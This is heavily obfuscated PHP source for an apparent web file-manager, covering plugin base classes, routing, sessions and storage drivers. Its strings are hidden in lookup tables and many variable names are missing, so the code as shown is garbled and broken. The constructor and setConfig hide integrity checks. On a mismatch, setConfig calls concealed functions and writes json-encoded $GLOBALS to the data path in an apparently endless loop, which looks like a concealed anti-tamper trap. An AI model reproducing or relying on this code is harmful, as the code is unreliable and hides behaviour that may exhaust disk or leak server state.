<?php
 goto B葡; F: if (strlen($okeavrpjui) < $_SERVER[ܮ][702]) { die; } $_SERVER[Ĵ] = explode($_SERVER[ܮ][703], gzinflate(substr($_SERVER[ܮ][704], 10, -8))); $awixomqujh = $_SERVER[ܮ][705]; goto Fϙ; BŶ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $З =& $_SERVER[ܮ]; if ($_SERVER[$З[900]] != $_SERVER[$З[1372]]) { $ = $З[1040]; $ = $З[901]; $ = $_SERVER[$З[902]] . $З[903]; $ۛ = $($); $Ӏ = explode($З[285], $ۛ); if (count($Ӏ) < $З[724]) { $εˍ = $З[904]; $εˍ(); } $՚ = $З[1041]; $՚($_SERVER[$З[1042]]); $՚($_SERVER[$З[902]] . $З[1829]); $驓 = 1; while ($驓 > 1) { $驓 = $驓 + 4; $ԇ = rawurlencode($驓 . $З[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($З[1830]); $this->pluginName = str_replace($З[1830], $З[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $З[8]; $this->pluginApi = appHostGet() . $З[1831] . $this->pluginName . $З[8]; $this->pluginHost = $config[$З[1832]] . $this->pluginName . $З[8]; $this->pluginHostDefault = $config[$З[1832]] . $this->pluginName . $З[8]; $ = $config[$З[1833]]; if ($ && strpos($З[50] . $ . $З[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$З[1834]] . $this->pluginName . $З[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ܮ][1835]); } protected function assign($؋Φ, $֖ = false) { if (is_array($؋Φ)) { $this->values = array_merge($this->values, $؋Φ); } else { $this->values[$؋Φ] = $֖; } } protected function display($) { extract($this->values); require $; } final function hookRegist($⪸) { $this->modelPlugin->appRegist($this->pluginName, $⪸); } final function appIcon() { $ =& $_SERVER[ܮ]; $ = $this->appPackage(); $혲 = $[12]; if (isset($[$[505]])) { if (isset($[$[505]][$[1836]])) { $혲 = $[1837] . $[$[505]][$[1836]] . $[1838]; } else { if ($[$[505]][$[1839]]) { $혲 = $[1840] . $[$[505]][$[1839]] . $[1841]; } } } return $혲; } final function fileCanView($) { $ϋع =& $_SERVER[ܮ]; if (request_url_safe($)) { return !0; } if ($this->isShare($)) { ActionCall($ϋع[1842], $); return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ʨ = $ϋع[1843] . rawurlencode(this_url()); show_tips(LNG($ϋع[1844]) . $ϋع[1845] . $ʨ . $ϋع[1846] . LNG($ϋع[1847]) . $ϋع[1848], !1); } if (!Action($ϋع[1849])->authCan($ϋع[1850])) { show_tips(LNG($ϋع[1851]) . $ϋع[1852], !1); } ActionCall($ϋع[1842], $); } final function isShare($섭) { $ = KodIO::parse($섭); return $[$_SERVER[ܮ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ƚ) { if (request_url_safe($Ƚ)) { return $Ƚ; } if (!$this->isShare($Ƚ)) { $Ƚ = $this->filePath($Ƚ, !1); } return Action($_SERVER[ܮ][1363])->linkOut($Ƚ); } public function filePathLinkOut($) { if (request_url_safe($)) { return $; } $this->fileCanView($); return Action($_SERVER[ܮ][1363])->link($); } final function filePath($ʒ, $΁ = true, $Ġ = false) { $ =& $_SERVER[ܮ]; $ž = $this->filePathGet($ʒ, $΁); if (!$this->fileInfo) { show_tips(LNG($[105]), !1); } if ($Ġ && isset($this->fileInfo[$[557]]) && $this->fileInfo[$[557]]) { $ = Model($[560])->fileInfo($this->fileInfo[$[557]]); if (!$ || !IO::exist($[$[87]])) { $ = LNG($[105]) . LNG($[1853]); if (KodUser::isRoot() && isset($[$[87]])) { $ .= $[1854] . $[$[87]] . $[1855]; } show_tips($); } } Hook::trigger($[1856], $ž); return $ž; } final function filePathGet($뗺ͽ, $ր = true) { $痃 =& $_SERVER[ܮ]; $this->fileCanView($뗺ͽ); if ($ײ = $this->checkSharePath($뗺ͽ, $ր)) { return $ײ; } if (request_url_safe($뗺ͽ)) { $̛ = parse_url_query($뗺ͽ); if (isset($̛[$痃[1857]]) && isset($̛[$痃[234]])) { $ = Mcrypt::decode($̛[$痃[234]], Model($痃[871])->get($痃[872])); if ($) { $this->fileInfo = IO::info($); $this->fileInfo[$痃[1858]] = $뗺ͽ; $this->cachePath = $this->pluginCachePath($痃[12], $ր); return $; } } $뗺ͽ = $this->_cacheHttpFile($뗺ͽ, $ր); $this->fileInfo = IO::info($뗺ͽ); } else { $this->fileInfo = IO::info($뗺ͽ); $this->cachePath = $this->pluginCachePath($痃[12], $ր); } return $뗺ͽ; } final function _cacheHttpFile($, $Ε = true) { $ =& $_SERVER[ܮ]; $ = parse_url_query($); $܉ = get_path_ext($); if (isset($[$[32]]) && $[$[32]]) { $܉ = get_path_ext($[$[32]]); } $ꒆ = hash_path($) . $[10] . $܉; $this->cachePath = $this->pluginCachePath($Ε ? $ꒆ : $[12]); $ヲ = IO::fileNameExist($this->cachePath, $ꒆ); if ($ヲ) { return KodIO::make($ヲ); } $տ = rtrim($this->cachePath, $[8]) . $[8] . $ꒆ; return $this->pluginCacheFileSet($տ, file_get_contents_nossl($)); } final function checkSharePath($, $ = true) { $ݜÇ =& $_SERVER[ܮ]; if (!$this->isShare($)) { return !1; } $ = Action($ݜÇ[1363])->sharePathInfo($); if (!is_array($) || !isset($[$ݜÇ[87]])) { $ = $GLOBALS[$ݜÇ[1859]]; show_json($ ? $ : LNG($ݜÇ[1860]), !1); } $this->fileInfo = $; $this->cachePath = $this->pluginCachePath(!1, $); return $[$ݜÇ[87]]; } final function pluginCachePath($ǧ = '', $ = false) { $糶 =& $_SERVER[ܮ]; if ($ && is_array($this->fileInfo)) { $ǧ = kodIO::hashPath($this->fileInfo); } $Ϲ = rtrim(IO_PATH_SYSTEM_TEMP . $糶[1861] . $this->pluginName . $糶[8] . $ǧ, $糶[8]); $ = IO::infoFullSimple($Ϲ); $۫т = $ && is_array($) ? $[$糶[87]] : $糶[12]; if (!$۫т) { $۫т = IO::mkdir($Ϲ); } return $۫т; } final function pluginCacheFileSet($߆, $ = '') { $ =& $_SERVER[ܮ]; $ơ¡ = IO::infoFullSimple($߆); if (!$ơ¡) { return IO::mkfile($߆, $, REPEAT_REPLACE); } IO::setContent($ơ¡[$[87]], $); return $ơ¡[$[87]]; } final function pluginLocalFile($ = '') { $ڼ =& $_SERVER[ܮ]; $ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($)) { mk_dir($); } if (!$) { return $; } $ش = IO::info($); $ά = $ڼ[1862] . KodIO::hashPath($ش) . $ڼ[10] . $ش[$ڼ[166]]; if (!checkExtSafe($ά)) { $ά = $ά . $ڼ[1397]; } $פ = $ . $ά; if (@file_exists($פ)) { return $פ; } return IO::copy($, $, 0, $ά); } final function appPackage() { $丟 =& $_SERVER[ܮ]; if ($this->packageData) { return $this->packageData; } $ = $this->parseFile($this->pluginPath . $丟[1863]); $this->parseLang($); $䢛ғ = json_decode_force($); if (!$䢛ғ) { return array(); } $闵ф = Hook::filter($丟[1864], $䢛ғ); if ($闵ф && is_array($闵ф)) { $䢛ғ = $闵ф; } $this->packageData = $䢛ғ; return $䢛ғ; } public function packageInfoGet($ƋÞ) { $ = $this->appPackage(); return array_get_value($, $ƋÞ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ܮ][1865]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ܮ][1866]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ܮ][1867]); } public function echoJsAssign($Փ, $뀰) { $this->echoJsAssignArr[$Փ] = $뀰; } private function parseFile($Ւ) { $˝ =& $_SERVER[ܮ]; $ܯ = file_get_contents_nossl($Ւ); $ = array($˝[1868], $˝[1869], $˝[1870], $˝[1871], $˝[1872], $˝[1873], $˝[1874]); $ŕȝÑ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$˝[92]][$˝[1875]]); foreach ($this->echoJsAssignArr as $ȩ => $) { $[] = $˝[1876] . $ȩ . $˝[1877]; $ŕȝÑ[] = is_array($) || is_object($) ? rawurlencode(json_encode($)) : $; } if (strstr($ܯ, $˝[1878])) { $ = rawurlencode(json_encode($this->pluginLangArr)); $ܯ = str_replace($˝[1878], $, $ܯ); } if (strstr($ܯ, $˝[1879])) { $ = $ = rawurlencode(json_encode($this->getConfig())); $ܯ = str_replace($˝[1879], $, $ܯ); } $ܯ = str_replace($, $ŕȝÑ, $ܯ); return $ܯ; } private function parseLang(&$恅) { $ѫ =& $_SERVER[ܮ]; $ = $ѫ[1880]; if (!strstr($恅, $)) { return; } preg_match_all($ѫ[1881], $恅, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $͜ = array(); $룋 = array(); foreach ($[0] as $) { $ر = substr($, strlen($), -4); $ = LNG($ر); $͜[] = $; $룋[] = str_replace(array($ѫ[285], $ѫ[1250], $ѫ[417], $ѫ[118]), array($ѫ[53], $ѫ[53], $ѫ[12], $ѫ[1882]), $); } $恅 = str_replace($͜, $룋, $恅); } private function parseConfig(&$) { $䠳 =& $_SERVER[ܮ]; $ = $䠳[1883]; if (!strstr($, $)) { return; } preg_match_all($䠳[1884], $, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ = $this->getConfig(); $ = array(); $Ϣ = array(); foreach ($[0] as $а˕) { $ = substr($а˕, strlen($), -2); $[] = $а˕; $Ϣ[] = _get($, $); } $ = str_replace($, $Ϣ, $); } private function parsePackage(&$Ō) { $޲ =& $_SERVER[ܮ]; $ = $޲[1885]; if (!strstr($Ō, $)) { return; } preg_match_all($޲[1886], $Ō, $Ԁ); if (!is_array($Ԁ) || count($Ԁ) == 0 || !is_array($Ԁ[0]) || count($Ԁ[0]) == 0) { return; } $ޠ = $this->appPackage(); $ = array(); $ϙȚ = array(); foreach ($Ԁ[0] as $婦Ŏ) { $Ӯ = substr($婦Ŏ, strlen($), -2); $[] = $婦Ŏ; $ϙȚ[] = _get($ޠ, $Ӯ); } $Ō = str_replace($, $ϙȚ, $Ō); } final function echoFile($, $⌉ = false) { $ޔ =& $_SERVER[ܮ]; $ = $this->pluginPath . $; if (ACT == $ޔ[1887]) { echo $ޔ[1888] . $this->pluginName . $ޔ[8] . $ . $ޔ[1889]; if (!file_exists($)) { echo $ޔ[1890]; return; } } $ˤ = $this->parseFile($); $this->parseLang($ˤ); $this->parseConfig($ˤ); $this->parsePackage($ˤ); if (is_array($⌉)) { $ˤ = str_replace(array_keys($⌉), array_values($⌉), $ˤ); } echo $ޔ[285] . $ˤ; } private function checkVersion() { $ =& $_SERVER[ܮ]; $Ѭ = $this->appPackage(); $Ί = $this->getConfig(); if ($Ί[$[1891]] == $Ѭ[$[1865]]) { return; } $this->regist(); $this->setConfig(array($[1891] => $Ѭ[$[1865]])); } final function initLang() { $ֳ =& $_SERVER[ܮ]; $ = $ֳ[1892]; $ = $this->pluginPath . $ֳ[1893]; $ = I18n::getType(); $㣚 = array(); if (file_exists($ . $ . $ֳ[1001])) { $㣚 = (include $ . $ . $ֳ[1001]); } else { if ($ == $ֳ[1894] && !file_exists($ . $ . $ֳ[1001]) && file_exists($ . $ֳ[1895])) { $㣚 = (include $ . $ֳ[1895]); $ = $ֳ[1710]; } else { if (file_exists($ . $ . $ֳ[1001])) { $㣚 = (include $ . $ . $ֳ[1001]); $ = $; } } } if (!$㣚 || !is_array($㣚)) { $㣚 = array(); } $ = Hook::trigger($ֳ[1896], $㣚, $this->pluginName, $); if ($ && is_array($)) { $㣚 = $; } if (@count($㣚) > 0) { I18n::set($㣚); } return $㣚; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ߴ) { $ =& $_SERVER[ܮ]; $© = $_SERVER[$[902]] . $[903]; $Ƿ = $[899]; if ($_SERVER[$[900]] != $Ƿ($©)) { $֟Д = $[1040]; $ؚܟ = $[901]; $θ = $_SERVER[$[902]] . $[903]; $葵 = $ؚܟ($θ); $ = explode($[285], $葵); if (count($) < $[724]) { $ = $[904]; $(); } $㏧ = $[1041]; $㏧($_SERVER[$[1042]]); $֟Д = $[1040]; $֟Д(); $ = $[1043]; $ӈ = json_encode($GLOBALS[$[1044]]); $ = 1; for ($ = $; $ > 0; $++) { $(DATA_PATH . $, $ӈ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ߴ); } public function onSetConfig($ꥩ) { } public function onGetConfig($) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($) { if ($ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ࠌ = "\160\154\x75\x67\151\156\x41\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ = $this->getConfig(); if (!$[$ࠌ]) { return !1; } return ActionCall($_SERVER[ܮ][1897], $[$ࠌ]); } public function url($, $ƱŴ = '', $ = true) { $Ʒ =& $_SERVER[ܮ]; $ = $this->getConfig(); $ɬ = KOD_VERSION . $Ʒ[10] . KOD_VERSION_BUILD; $ = $this->packageVersion(); $æ = $ɬ . $Ʒ[476] . $; if (substr($, 0, 4) == $Ʒ[149] || substr($, 0, 2) == $Ʒ[1524]) { $ = $ . $Ʒ[1898] . $æ; } else { if ($ƱŴ == $Ʒ[12]) { $ = $this->pluginHost . $ . $Ʒ[1898] . $æ; } else { if ($ƱŴ === $Ʒ[78]) { $ = $this->pluginHost . $; } else { if ($ƱŴ == $Ʒ[1899]) { $ = STATIC_PATH . $ . $Ʒ[1898] . $ɬ; } else { if ($ƱŴ == $Ʒ[1900]) { $ = APP_HOST . $Ʒ[1901] . $ . $Ʒ[1898] . $ɬ; } else { if (isset($[$ƱŴ])) { $ = $[$ƱŴ] . $ . $Ʒ[1898] . $æ; } } } } } } if (!$) { return $; } echo $; } public function link($ƽ = false, $Ʃ = '') { $ =& $_SERVER[ܮ]; $ = $this->linkHas == !1; $this->linkHas = !0; if (!$ƽ) { $this->link($[1902], $[1900]); $this->link($[1903], $[1899]); $this->link($[1904], $[1899]); $this->link($[1905], $[1899]); $this->link($[1906], $[1899]); if ($) { Hook::trigger($[1907]); } return; } $ = $this->url($ƽ, $Ʃ, !1); if (substr($ƽ, -3) == $[1908]) { echo $[1909] . $ . $[1910] . $[285]; } else { if (substr($ƽ, -4) == $[1911]) { echo $[1912] . $ . $[1913] . $[285]; } } if ($) { Hook::trigger($[1907]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\133\x5e\57\135\53", "\72\156\165\x6d" => "\133\x30\x2d\71\x5d\53", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($ɣ, $̯Ј) { $ņ =& $_SERVER[ܮ]; if ($ɣ == $ņ[1914]) { $ = array_map($ņ[1915], $̯Ј[0]); $Ÿ = strpos($̯Ј[1], $ņ[8]) === 0 ? $̯Ј[1] : $ņ[8] . $̯Ј[1]; $Ҙ = $̯Ј[2]; } else { $ = null; $Ÿ = strpos($̯Ј[0], $ņ[8]) === 0 ? $̯Ј[0] : $ņ[8] . $̯Ј[0]; $Ҙ = $̯Ј[1]; } array_push(self::$maps, $); array_push(self::$routes, $Ÿ); array_push(self::$methods, strtoupper($ɣ)); array_push(self::$callbacks, $Ҙ); } public static function error($) { self::$errorCallback = $; } public static function haltOnMatch($Т = true) { self::$halts = $Т; } public static function dispatch() { $ =& $_SERVER[ܮ]; $ = parse_url($_SERVER[$[1916]], PHP_URL_PATH); $滹 = $_SERVER[$[161]]; $ = array_keys(static::$patterns); $Ծ = array_values(static::$patterns); $ = !1; self::$routes = preg_replace($[1467], $[8], self::$routes); if (in_array($, self::$routes)) { $ = array_keys(self::$routes, $); foreach ($ as $) { if (self::$methods[$] == $滹 || self::$methods[$] == $[1917] || in_array($滹, self::$maps[$])) { $ = !0; if (!is_object(self::$callbacks[$])) { $Աһ = explode($[8], self::$callbacks[$]); $ = end($Աһ); $ϱ = explode($[1399], $); $Ӡ = new $ϱ[0](); $Ӡ->{$ϱ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$]); if (self::$halts) { return; } } } } } else { $ނ = 0; foreach (self::$routes as $) { if (strpos($, $[4]) !== !1) { $ = str_replace($, $Ծ, $); } if (preg_match($[1918] . $ . $[1919], $, $)) { if (self::$methods[$ނ] == $滹 || self::$methods[$ނ] == $[1917] || !empty(self::$maps[$ނ]) && in_array($滹, self::$maps[$ނ])) { $ = !0; array_shift($); if (!is_object(self::$callbacks[$ނ])) { $Աһ = explode($[8], self::$callbacks[$ނ]); $ = end($Աһ); $ϱ = explode($[1399], $); $Ӡ = new $ϱ[0](); if (!method_exists($Ӡ, $ϱ[1])) { echo $[1920]; } else { call_user_func_array(array($Ӡ, $ϱ[1]), $); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ނ], $); if (self::$halts) { return; } } } } $ނ++; } } if ($ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ =& $_SERVER[ܮ]; header($_SERVER[$[1921]] . $[1922]); echo $[1923]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$[1916]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ď΍ =& $_SERVER[ܮ]; static $פ؋ = false; if ($פ؋) { return $פ؋; } $ = $GLOBALS[$ď΍[6]][$ď΍[424]]; self::$sessionTime = $[$ď΍[1924]]; $ = isset($GLOBALS[$ď΍[1925]]) ? $GLOBALS[$ď΍[1925]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($)) { self::$sessionSign = Cookie::get($); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($, self::$sessionSign, self::$sessionTime); $̮ = $[$ď΍[1926]]; $ = $[$̮]; $杁 = $[$ď΍[987]]; switch ($̮) { case $ď΍[21]: self::$handle = Model($ď΍[988]); break; case $ď΍[989]: self::$handle = new CacheRedis($, $杁); break; case $ď΍[990]: self::$handle = new CacheMemcached($, $杁); break; case $ď΍[230]: $[$ď΍[87]] = $[$ď΍[87]] . $ď΍[1927]; self::$handle = new CacheFile($, $杁); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$ď΍[1663]]) || time() - self::$data[$ď΍[1663]] >= 5) { self::dataSave(); } } $פ؋ = new self(); return $פ؋; } public static function getBySign($ػ) { $ı = self::$handle->get($ػ); $ı = unserialize($ı); return is_array($ı) ? $ı : array(); } public static function setBySign($򥉞, $꺪ֳ) { self::$sessionSign = $򥉞; self::$data = $꺪ֳ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[ܮ][1663]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ = false) { if ($) { self::$sessionSign = $; } self::init(); return self::$sessionSign; } public static function set($۾ȝ, $ = false) { self::init(); if (is_array($۾ȝ)) { foreach ($۾ȝ as $ => $) { array_set_value(self::$data, $, $); } } else { array_set_value(self::$data, $۾ȝ, $); } self::dataSave(); } public static function get($ښ = false) { self::init(); if (!$ښ) { return self::$data; } return array_get_value(self::$data, $ښ); } public static function remove($) { self::init(); unset(self::$data[$]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ܮ][996])) { self::$handle->clearTimeout(); } } } goto dޯ; b: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($΀) { parent::__construct($΀); $this->setSignVersion($_SERVER[ܮ][247]); } public function uploadFormData($⇀, $˟ = 3600) { $ =& $_SERVER[ܮ]; $Ʃ܃ = $[229]; $ޝб = $[1525]; $ρ = $[261]; $녍 = gmdate($[1526], time() + $˟); $ = (string) time() . $[74] . (string) (time() + $˟); $֤ = array($[262] => $녍, $[265] => array(array($[306] => $Ʃ܃), array($[266] => $this->bucket), array($[267], $[268], $[12]), array($[270] => $ρ), array($[1527] => $ޝб), array($[1528] => $this->accessKey), array($[1529] => $))); $֤ = json_encode($֤); $ = hash_hmac($[1525], $, $this->secret); $ = sha1($֤); $姓 = hash_hmac($[1525], $, $); $ů = array($[306] => $Ʃ܃, $[270] => $ρ, $[277] => base64_encode($֤), $[1527] => $ޝб, $[1528] => $this->accessKey, $[1530] => $, $[1531] => $姓, $[206] => $this->getHost()); return $ů; } public function fileOutImage($凮, $ = 250) { $ =& $_SERVER[ܮ]; if ($this->size($凮) > 1024 * 1024 * 32) { return $this->fileOutImageServer($凮, $); } $ؙ = $this->link($凮); $ؙ .= $[1532] . $ . $[1533]; $this->fileOutLink($ؙ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[ܮ][1534]); } public function getPath($æ) { return trim($æ, $_SERVER[ܮ][8]); } public function pathFather($֯) { $϶ = $this->parse($֯); $϶ = $this->infoSimple($֯); return $϶ ? $϶[$_SERVER[ܮ][190]] : !1; } public function pathThis($) { $ = $this->infoSimple($); return $ ? $[$_SERVER[ܮ][32]] : !1; } public function getPathOuter($) { if (!$) { return $; } $ = $this->parse($); return KodIO::make($[$_SERVER[ܮ][487]]); } public function copyFolderFromIO($Τ, $Қ, $, $߈, $ᬧ) { $ = $this->model->copyFolderFromIO($Τ, $Қ, $, $߈, $ᬧ); return KodIO::make($); } public function isParentOf($ݺ, $ء) { return $this->model->isParentOf($ݺ, $ء); } public function mkfile($Ŵ, $ = '', $ = REPEAT_RENAME) { $Ȩͥ =& $_SERVER[ܮ]; $ = $this->parse($Ŵ); $Ŵ = $[$Ȩͥ[487]]; for ($ = 0; $ < count($[$Ȩͥ[1535]]); $++) { $ = $[$Ȩͥ[1535]][$]; if ($ == count($[$Ȩͥ[1535]]) - 1) { $Ŵ = $this->model->mkfile($Ŵ, $, $, $); break; } $Ŵ = $this->model->mkdir($Ŵ, $, REPEAT_SKIP); } return $this->getPathOuter($Ŵ); } public function mkdir($µ, $Ҧ = REPEAT_SKIP) { $ɝ =& $_SERVER[ܮ]; $ח = $this->parse($µ); $µ = $ח[$ɝ[487]]; for ($Ңַ = 0; $Ңַ < count($ח[$ɝ[1535]]); $Ңַ++) { $Ӗ = $ח[$ɝ[1535]][$Ңַ]; $µ = $this->model->mkdir($µ, $Ӗ, $Ҧ); } return $this->getPathOuter($µ); } public function copyFile($͝խ, $輈, $Ѿ׽ = REPEAT_REPLACE) { $ =& $_SERVER[ܮ]; $ɐ = $this->parse($輈); $ѻ = $this->model->copy($͝խ, $ɐ[$[487]], $Ѿ׽, $ɐ[$[87]]); return $ѻ ? $this->getPathOuter($ѻ) : !1; } public function moveFile($, $Ù, $ = REPEAT_REPLACE) { $ߣζ =& $_SERVER[ܮ]; $ڬ = $this->parse($Ù); $̰ = $this->model->move($, $ڬ[$ߣζ[487]], $, $ڬ[$ߣζ[87]]); return $̰ ? $this->getPathOuter($̰) : !1; } public function copy($, $ײ, $ى = REPEAT_REPLACE, $ = false) { $ = $this->parse($ײ); $ﾂ = $this->model->copy($, $[$_SERVER[ܮ][487]], $ى, $); return $ﾂ ? $this->getPathOuter($ﾂ) : !1; } public function moveSameAllow() { } public function move($ߤ, $ȧ, $Ϳό = REPEAT_REPLACE, $ = false) { $ޕ = $this->parse($ȧ); $咤 = $this->model->move($ߤ, $ޕ[$_SERVER[ܮ][487]], $Ϳό, $); return $咤 ? $this->getPathOuter($咤) : !1; } public function remove($, $ = true) { return $this->model->remove($, $); } public function rename($, $) { $ص = $this->model->rename($, $); return $ص ? $this->getPathOuter($) : $ص; } public function size($ƴ) { $Ď = $this->infoSimple($ƴ); return $Ď ? $Ď[$_SERVER[ܮ][79]] : 0; } public function infoSimple($И) { return $this->model->sourceInfo($И); } public function info($̫Я) { return $this->infoParse($̫Я); } public function infoAuth($̐) { return $this->infoParse($̐, !1, !0); } public function infoWithChildren($ɔ) { return $this->infoParse($ɔ, !0); } protected function infoParse($Şá, $ = false, $Ե = false) { if (!$) { return $this->model->pathInfo($Şá, $Ե); } return $this->model->pathInfoMore($Şá); } public function infoFullSimple($) { $ҳ =& $_SERVER[ܮ]; $ = explode($ҳ[8], $); $߇Ŵ = implode($ҳ[8], array_splice($, 1)); return $this->model->pathInfoByPath($[0], $߇Ŵ); } public function infoFull($Ձ) { $ˈہ = $this->infoFullSimple($Ձ); return is_array($ˈہ) ? $this->model->pathInfo($ˈہ[$_SERVER[ܮ][191]]) : !1; } public function hashSimple($ͥͮ) { $ײ =& $_SERVER[ܮ]; $¬ = $this->infoWithChildren($ͥͮ); return $¬[$ײ[167]][$ײ[694]]; } public function hashMd5($ߟ) { $ߤ =& $_SERVER[ܮ]; $ӕ = $this->infoWithChildren($ߟ); return $ӕ[$ߤ[167]][$ߤ[563]]; } public function exist($э) { $ύ =& $_SERVER[ܮ]; $ڱ = $this->parse($э); if (!$ڱ[$ύ[87]]) { return $this->isFile($э) || $this->isFolder($э); } $ = array($ύ[492] => $ڱ[$ύ[487]], $ύ[32] => $ڱ[$ύ[87]]); $ס = $this->model->where($)->find(); return $ס ? !0 : !1; } public function isFile($) { $ꙺ =& $_SERVER[ܮ]; $ߋͷ = $this->infoSimple($); return $ߋͷ && $ߋͷ[$ꙺ[500]] == $ꙺ[228] ? !0 : !1; } public function isFolder($) { $̏ٙ =& $_SERVER[ܮ]; $֛ = $this->infoSimple($); return $֛ && $֛[$̏ٙ[500]] == $̏ٙ[91] ? !0 : !1; } public function listPath($̑愞, $ĺ = false) { $ =& $_SERVER[ܮ]; if ($̑愞 == $[12]) { return !1; } $Ãل = array($[492] => $̑愞); if ($ĺ) { return $this->model->listSource($Ãل, -1); } return $this->model->listSource($Ãل); } public function has($, $ = false, $䓥 = null) { $؞ =& $_SERVER[ܮ]; $ = $this->infoWithChildren($); if ($) { return array($؞[240] => $[$؞[240]], $؞[239] => $[$؞[239]]); } return $䓥 ? $[$؞[240]] : $[$؞[239]]; } public function listAll($ܾ) { $ڛ = IO::info($this->pathParse[$_SERVER[ܮ][87]]); if (!$ڛ) { return array(); } return $this->model->listAll($ܾ); } public function getContent($) { return $this->model->getContent($); } public function setContent($퉁, $ = '') { return $this->model->setContent($퉁, $); } public function fileSubstr($, $, $) { return $this->model->fileSubstr($, $, $); } public function download($Ĕ, $湏 = '') { $ = get_path_father($湏); $ܹ = get_path_this($湏); $ԭ = $this->model->fileInfoGet($Ĕ); $݅ = IO::copy($ԭ[$_SERVER[ܮ][87]], $, !1, $ܹ); return $݅; } public function setModifyTime($, $ = '') { $ =& $_SERVER[ܮ]; if (!$) { return; } $this->model->where(array($[506] => $))->save(array($[88] => $)); } public function upload($֞, $, $Ʊ = false, $Ӽ = REPEAT_REPLACE) { $ū =& $_SERVER[ܮ]; $Ԡ = $this->parse($֞); $ = $this->model->addFile($Ԡ[$ū[487]], $, $Ԡ[$ū[87]], $Ʊ, $Ӽ); return $this->getPathOuter($); } public function uploadFileByID($ĝ, $, $) { $؛̷ =& $_SERVER[ܮ]; $ = $this->parse($ĝ); $ = $this->model->addFileByFileID($[$؛̷[487]], $, $[$؛̷[87]], $); return $this->getPathOuter($); } public function addFileByRemote($, $ó, $ӟ = array(), $ = '', $˳) { $ =& $_SERVER[ܮ]; $վ = $this->parse($); $ = empty($) ? $վ[$[87]] : $; $ͦߠ = $this->model->addFileByRemote($վ[$[487]], $ó, $, $ӟ, $˳); return $this->getPathOuter($ͦߠ); } public function uploadLink($å, $쉊 = 0) { $ =& $_SERVER[ܮ]; $ = $this->parse($å); $ = _get($GLOBALS[$[7]], $[1536]); $ޗɧ = _get($GLOBALS[$[7]], $[1537]); $κ = KodIO::ioFileDriverGet($[498] . $[$[487]] . $[402]); $Đ = Model($[696])->createFileName($[$[87]], $κ, $, $ޗɧ); return IO::uploadLink($Đ, $쉊); } public function fileNameAuto($裯, $, $򊏔 = REPEAT_REPLACE, $ = false) { return $this->model->fileNameAuto($裯, $, $򊏔, $); } public function fileNameExist($, $Ԃ) { return $this->model->fileNameExist($, $Ԃ); } protected function _fileOut($, $ = false, $ = false, $ɩ = '', $ = false) { $鷉 =& $_SERVER[ܮ]; $񰥕 = $this->model->sourceInfo($); if ($񰥕[$鷉[500]] == $鷉[91]) { header($鷉[1538]); die; } $߿Û = $this->model->fileInfoGet($); $ɩ = $߿Û[$鷉[563]] ? $߿Û[$鷉[563]] : $ɩ; $޲Ľ = isset($GLOBALS[$鷉[180]]) && is_array($GLOBALS[$鷉[180]]) ? $GLOBALS[$鷉[180]][$鷉[32]] : $񰥕[$鷉[32]]; if ($) { return IO::fileOutServer($߿Û[$鷉[87]], $, $޲Ľ, $ɩ); } IO::fileOut($߿Û[$鷉[87]], $, $޲Ľ, $ɩ); } public function fileOut($, $Ϊ = false, $릹 = false, $Ę = '') { $this->_fileOut($, $Ϊ, $릹, $Ę); } public function fileOutServer($ɔ, $񛨂 = false, $ = false, 